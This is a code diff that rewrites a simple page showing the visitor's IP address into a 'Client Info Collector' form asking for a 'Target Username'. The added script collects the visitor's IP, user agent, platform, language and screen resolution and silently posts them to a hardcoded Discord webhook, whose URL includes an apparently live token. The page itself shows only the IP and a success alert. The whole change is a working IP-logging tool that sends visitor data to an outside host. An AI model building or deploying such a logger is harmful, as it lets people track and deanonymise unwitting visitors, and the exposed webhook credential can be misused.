@@ -3,29 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Check your IP Address</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-    </style>
+    <title>Client Info Collector</title>
 </head>
 <body>
-    <h1>Your IP Address</h1>
-    <p id="ip-address">Loading...</p>
+    <h1>Submit Your Target Username</h1>
+    <form id="infoForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <button type="submit">Send</button>
+    </form>
+    
+    <div id="result"></div>
 
     <script>
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ip-address').textContent = data.ip;
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-                document.getElementById('ip-address').textContent = 'Failed to fetch IP address';
-            });
+        document.getElementById('infoForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const webhookUrl = 'https://discord.com/api/webhooks/1223650113021411419/Q4mT3Sy9DV7vcZNkRJLk5RUJ8z61cdnbIOtZ8pK9oWIwJDLI0J1D-6u9KNqAoEzAbMau'; // Replace with your actual webhook URL
+            const ipApiUrl = 'https://api.ipify.org?format=json';
+
+            try {
+                // Fetch the IP address
+                const ipResponse = await fetch(ipApiUrl);
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // Collect client information
+                const clientInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${screen.width}x${screen.height}`
+                };
+
+                // Display IP address
+                document.getElementById('result').innerText = `Your IP Address: ${userIp}`;
+
+                // Prepare data to send to the webhook
+                const data = {
+                    username: username,
+                    ip: userIp,
+                    clientInfo: clientInfo
+                };
+
+                // Send data to the webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                alert('Information has been sent successfully.');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to get IP address or send data.');
+            }
+        });
     </script>
 </body>
 </html>
